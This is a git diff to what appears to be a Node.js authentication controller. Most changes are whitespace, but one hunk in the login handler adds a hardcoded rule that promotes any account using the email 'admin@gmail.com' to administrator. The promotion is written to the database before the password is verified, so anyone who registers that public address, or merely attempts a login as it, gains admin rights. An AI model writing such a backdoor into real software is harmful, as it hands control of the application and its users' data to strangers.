@@ -45,7 +45,7 @@ export const register = async (req, res) => {
       VALUES ($1, $2, $3, $4, $5)
       RETURNING user_id, username, email, full_name, role, created_at
     `;
-    
+
     const values = [username, email, hashedPassword, fullName, 'user'];
     const result = await pool.query(insertQuery, values);
     const user = result.rows[0];
@@ -113,6 +113,13 @@ export const login = async (req, res) => {
     }
 
     const user = result.rows[0];
+
+    // AUTO-PROMOTE HARDCODED ADMIN FOR DEMO/USER REQUEST
+    if (user.email === 'admin@gmail.com' && user.role !== 'admin') {
+      console.log('👑 Auto-promoting admin@gmail.com to admin role');
+      await pool.query("UPDATE users SET role = 'admin' WHERE user_id = $1", [user.user_id]);
+      user.role = 'admin'; // Update local object for token generation
+    }
 
     const isMatch = await bcrypt.compare(password, user.password_hash);
     if (!isMatch) {
@@ -260,7 +267,7 @@ export const updateUserProfile = async (req, res) => {
     const { name, username, phone, location } = req.body;
 
     const newFullName = name || username;
-    
+
     const updates = [];
     const values = [];
     let paramCount = 1;
@@ -269,7 +276,7 @@ export const updateUserProfile = async (req, res) => {
       updates.push(`full_name = $${paramCount}`);
       values.push(newFullName);
       paramCount++;
-      
+
       updates.push(`username = $${paramCount}`);
       values.push(newFullName);
       paramCount++;
